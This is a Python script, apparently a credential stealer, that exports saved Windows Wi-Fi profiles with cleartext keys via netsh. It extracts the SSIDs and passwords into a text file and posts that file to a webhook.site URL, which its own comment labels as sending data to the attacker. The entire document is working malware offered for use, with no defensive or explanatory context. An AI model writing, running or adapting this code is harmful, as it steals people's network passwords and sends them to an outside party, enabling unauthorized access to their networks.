import subprocess
import os
import sys
import requests


url = 'https://webhook.site/0b9b501d-c7e1-4916-b9cb-e3c4663245bf'

# to create a file

datafile = open('wifi_credentials.txt', 'w')
datafile.write("### Wifi Credentials are below : \n")
datafile.close()

path = os.getcwd()

command = subprocess.run(['netsh', 'wlan', 'export', 'profile',
                          'key=clear'], capture_output=True).stdout.decode()

wifi_files = []
wifi_Name = []
wifi_Pass = []

for fileName in os.listdir(path):
    if fileName.startswith('Wi-Fi') and fileName.endswith('.xml'):
        wifi_files.append(fileName)
        for i in wifi_files:
            with open(i, 'r') as f:
                for line in f.readlines():
                    if 'name' in line:
                        stripped = line.strip()
                        fornt = stripped[6:]
                        back = fornt[:-7]
                        wifi_Name.append(back)
                    if 'keyMaterial' in line:
                        stripped = line.strip()
                        fornt = stripped[13:]
                        back = fornt[:-14]
                        wifi_Pass.append(back)
                        for x, y in zip(wifi_Name, wifi_Pass):
                            sys.stdout = open('wifi_credentials.txt', 'a')
                            sys.stdout.write(f"SSID : {x} , Password : {y} \n")
                            sys.stdout.close()


# send data to attacker
with open('wifi_credentials.txt', 'rb') as f:
    requests.post(url, data=f)
